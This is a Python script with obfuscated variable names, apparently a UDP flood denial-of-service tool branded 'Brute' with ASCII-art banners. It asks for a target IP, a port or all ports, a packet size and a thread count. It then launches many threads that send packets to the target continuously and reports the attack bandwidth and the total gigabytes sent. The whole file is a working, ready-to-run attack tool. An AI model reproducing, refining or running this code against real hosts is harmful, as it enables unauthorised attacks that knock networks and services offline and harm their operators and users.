from socket import socket ,AF_INET ,SOCK_DGRAM #line:1
from threading import Thread #line:3
from random import choices ,randint #line:4
from time import time ,sleep #line:5
from pystyle import *#line:7
from getpass import getpass as hinput #line:8
class Brutalize :#line:11
  def __init__ (OO0O00O0O0O0OOO00 ,O0OO0OOOOO0OOO0OO ,O000O00000OO0O0OO ,O00O0O00O0O000OOO ,O000O00O0O000OOOO ):#line:13
    OO0O00O0O0O0OOO00 .ip =O0OO0OOOOO0OOO0OO #line:14
    OO0O00O0O0O0OOO00 .port =O000O00000OO0O0OO #line:15
    OO0O00O0O0O0OOO00 .force =O00O0O00O0O000OOO #line:16
    OO0O00O0O0O0OOO00 .threads =O000O00O0O000OOOO #line:17
    OO0O00O0O0O0OOO00 .client =socket (family =AF_INET ,type =SOCK_DGRAM )#line:19
    OO0O00O0O0O0OOO00 .data =str .encode ("x"*OO0O00O0O0O0OOO00 .force )#line:21
    OO0O00O0O0O0OOO00 .len =len (OO0O00O0O0O0OOO00 .data )#line:22
  def flood (O0O0O00O0O0O0000O ):#line:24
    O0O0O00O0O0O0000O .on =True #line:25
    O0O0O00O0O0O0000O .sent =0 #line:26
    for _O000OOO00O0OO0OOO in range (O0O0O00O0O0O0000O .threads ):#line:27
      Thread (target =O0O0O00O0O0O0000O .send ).start ()#line:28
    Thread (target =O0O0O00O0O0O0000O .info ).start ()#line:29
  def info (OO0O00O00OO00000O ):#line:31
    O00OOO0OOO00OO00O =0.05 #line:33
    O000OOOO0O0OO0O0O =time ()#line:34
    OO0OOOO0O0OO00000 =0 #line:36
    OO0O00O00OO00000O .total =0 #line:37
    OOO0O000OO0O00O00 =8 #line:39
    OO0O00O0O00OOO00O =1000000 #line:40
    O0O0OO0O00O00OOOO =1000000000 #line:41
    while OO0O00O00OO00000O .on :#line:43
      sleep (O00OOO0OOO00OO00O )#line:44
      if not OO0O00O00OO00000O .on :#line:45
        break #line:46
      if OO0OOOO0O0OO00000 !=0 :#line:48
        OO0O00O00OO00000O .total +=OO0O00O00OO00000O .sent *OOO0O000OO0O00O00 /O0O0OO0O00O00OOOO *O00OOO0OOO00OO00O #line:49
        print (stage (f"{fluo}{round(OO0OOOO0O0OO00000)} {white}Mb/s {purple}-{white} Total: {fluo}{round(OO0O00O00OO00000O.total, 1)} {white}Gb. {' '*20}"),end ='\r')#line:53
      OO0O0O0O000OO00OO =time ()#line:55
      if O000OOOO0O0OO0O0O +1 >=OO0O0O0O000OO00OO :#line:57
        continue #line:58
      OO0OOOO0O0OO00000 =round (OO0O00O00OO00000O .sent *OOO0O000OO0O00O00 /OO0O00O0O00OOO00O )#line:60
      OO0O00O00OO00000O .sent =0 #line:61
      O000OOOO0O0OO0O0O +=1 #line:63
  def stop (O0000O0000O0OOO00 ):#line:65
    O0000O0000O0OOO00 .on =False #line:66
  def send (OO000000OO0OOOO00 ):#line:68
    while OO000000OO0OOOO00 .on :#line:69
      try :#line:70
        OO000000OO0OOOO00 .client .sendto (OO000000OO0OOOO00 .data ,OO000000OO0OOOO00 ._randaddr ())#line:71
        OO000000OO0OOOO00 .sent +=OO000000OO0OOOO00 .len #line:72
      except :#line:73
        pass #line:74
  def _randaddr (OO0O0OOO0OO0O0O0O ):#line:76
    return (OO0O0OOO0OO0O0O0O .ip ,OO0O0OOO0OO0O0O0O ._randport ())#line:77
  def _randport (OOOOO0OOOO000O000 ):#line:79
    return OOOOO0OOOO000O000 .port or randint (1 ,65535 )#line:80
ascii =r'''

$$$$$$$\                        $$\                     
$$  __$$\                       $$ |                    
$$ |  $$ | $$$$$$\  $$\   $$\ $$$$$$\    $$$$$$\        
$$$$$$$\ |$$  __$$\ $$ |  $$ |\_$$  _|  $$  __$$\       
$$  __$$\ $$ |  \__|$$ |  $$ |  $$ |    $$$$$$$$ |      
$$ |  $$ |$$ |      $$ |  $$ |  $$ |$$\ $$   ____|      
$$$$$$$  |$$ |      \$$$$$$  |  \$$$$  |\$$$$$$$\       
\_______/ \__|       \______/    \____/  \_______|      
                                                        
                                                        
                                                        
'''#line:96
banner =r"""
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@""".replace ('▓','▀')#line:119
banner =Add .Add (ascii ,banner ,center =True )#line:121
fluo =Col .light_red #line:123
fluo2 =Col .light_blue #line:124
white =Col .white #line:125
blue =Col .StaticMIX ((Col .blue ,Col .black ))#line:127
bpurple =Col .StaticMIX ((Col .purple ,Col .black ,blue ))#line:128
purple =Col .StaticMIX ((Col .purple ,blue ,Col .white ))#line:129
def init ():#line:132
  System .Size (140 ,40 ),System .Title (".B.r.u.t.e. .-. .b.y. .S.P.A.R.K.L.E.E.".replace ('.',''))#line:134
  Cursor .HideCursor ()#line:135
init ()#line:138
def stage (O0OO00O000000OOO0 ,symbol ='...'):#line:141
  OO000OO0OO0O0O000 =purple #line:142
  OOO0O000000O00O0O =white #line:143
  return f" {Col.Symbol(symbol, OOO0O000000O00O0O, OO000OO0OO0O0O000, '{', '}')} {OOO0O000000O00O0O}{O0OO00O000000OOO0}"#line:144
def error (OOOO0OO0OOO0OOOOO ,start ='\n'):#line:147
  hinput (f"{start} {Col.Symbol('!', fluo, white)} {fluo}{OOOO0OO0OOO0OOOOO}")#line:148
  exit ()#line:149
def main ():#line:152
  print ()#line:153
  print (Colorate .Diagonal (Col .DynamicMIX ((Col .white ,bpurple )),Center .XCenter (banner )))#line:156
  O000OO00O00000000 =input (stage (f"Enter the IP to Brutalize {purple}->{fluo2} ",'?'))#line:158
  print ()#line:159
  try :#line:161
    if O000OO00O00000000 .count ('.')!=3 :#line:162
      int ('error')#line:163
    int (O000OO00O00000000 .replace ('.',''))#line:164
  except :#line:165
    error ("Error! Please enter a correct IP address.")#line:166
  O0OOO00O00OOO0OO0 =input (stage (f"Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ",'?'))#line:171
  print ()#line:172
  if O0OOO00O00OOO0OO0 =='':#line:174
    O0OOO00O00OOO0OO0 =None #line:175
  else :#line:176
    try :#line:177
      O0OOO00O00OOO0OO0 =int (O0OOO00O00OOO0OO0 )#line:178
      if O0OOO00O00OOO0OO0 not in range (1 ,65535 +1 ):#line:179
        int ('error')#line:180
    except ValueError :#line:181
      error ("Error! Please enter a correct port.")#line:182
  O0OOO0OOOO000O0OO =input (stage (f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ",'?'))#line:187
  print ()#line:188
  if O0OOO0OOOO000O0OO =='':#line:190
    O0OOO0OOOO000O0OO =1250 #line:191
  else :#line:192
    try :#line:193
      O0OOO0OOOO000O0OO =int (O0OOO0OOOO000O0OO )#line:194
    except ValueError :#line:195
      error ("Error! Please enter an integer.")#line:196
  OO0OO0OOOO00O000O =input (stage (f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ",'?'))#line:201
  print ()#line:202
  if OO0OO0OOOO00O000O =='':#line:204
    OO0OO0OOOO00O000O =100 #line:205
  else :#line:206
    try :#line:207
      OO0OO0OOOO00O000O =int (OO0OO0OOOO00O000O )#line:208
    except ValueError :#line:209
      error ("Error! Please enter an integer.")#line:210
  print ()#line:212
  OO00O00O0O000000O =''if O0OOO00O00OOO0OO0 is None else f'{purple}:{fluo2}{O0OOO00O00OOO0OO0}'#line:213
  print (stage (f"Starting attack on {fluo2}{O000OO00O00000000}{OO00O00O0O000000O}{white}."),end ='\r')#line:214
  OO00O000OO0O0OOOO =Brutalize (O000OO00O00000000 ,O0OOO00O00OOO0OO0 ,O0OOO0OOOO000O0OO ,OO0OO0OOOO00O000O )#line:216
  try :#line:217
    OO00O000OO0O0OOOO .flood ()#line:218
  except :#line:219
    OO00O000OO0O0OOOO .stop ()#line:220
    error ("A fatal error has occured and the attack was stopped.",'')#line:221
  try :#line:222
    while True :#line:223
      sleep (1000000 )#line:224
  except KeyboardInterrupt :#line:225
    OO00O000OO0O0OOOO .stop ()#line:226
    print (stage (f"Attack stopped. {fluo2}{O000OO00O00000000}{OO00O00O0O000000O}{white} was Brutalized with {fluo}{round(OO00O000OO0O0OOOO.total, 1)} {white}Gb.",'.'))#line:230
  print ('\n')#line:231
  sleep (1 )#line:232
  hinput (stage (f"Press {fluo2}enter{white} to {fluo}exit{white}.",'.'))#line:234
if __name__ =='__main__':#line:237
  main ()